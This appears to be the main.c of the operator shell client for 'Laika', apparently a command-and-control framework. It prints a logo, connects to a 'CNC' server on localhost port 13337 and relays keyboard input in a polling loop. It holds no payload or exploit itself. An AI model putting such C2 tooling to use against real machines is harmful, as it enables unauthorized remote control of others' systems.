#include <stdio.h>

#include "sclient.h"
#include "sterm.h"

#define STRING(x) #x
#define MACROLITSTR(x) STRING(x)

const char *LOGO = "\n\t██╗      █████╗ ██╗██╗  ██╗ █████╗\n\t██║     ██╔══██╗██║██║ ██╔╝██╔══██╗\n\t██║     ███████║██║█████╔╝ ███████║\n\t██║     ██╔══██║██║██╔═██╗ ██╔══██║\n\t███████╗██║  ██║██║██║  ██╗██║  ██║\n\t╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝";

int main(int argv, char *argc[]) {
    tShell_client client;
    bool printPrompt = false;

    shellT_printf("%s%s\n%s", shellT_getForeColor(TERM_BRIGHT_RED), LOGO, shellT_getForeColor(TERM_BRIGHT_WHITE));
    shellT_printf("\t\t\t%s\n\n", " v" MACROLITSTR(LAIKA_VERSION_MAJOR) "." MACROLITSTR(LAIKA_VERSION_MINOR));

    shellC_init(&client);
    shellC_connectToCNC(&client, "127.0.0.1", "13337");

    shellT_conioTerm();
    while(laikaS_isAlive((&client.peer->sock))) {
        /* poll for 50ms */
        if (!shellC_poll(&client, 50)) {
            /* check if we have input! */
            if (shellT_waitForInput(0))
                shellT_addChar(&client, shellT_kbget());

            /* no prompt shown? show it */
            if (!printPrompt) {
                printPrompt = true;

                shellT_printPrompt();
            }
        } else {
            printPrompt = false;
        }
    }

    shellC_cleanup(&client);
    PRINTERROR("Connection closed\n");
    return 0;
}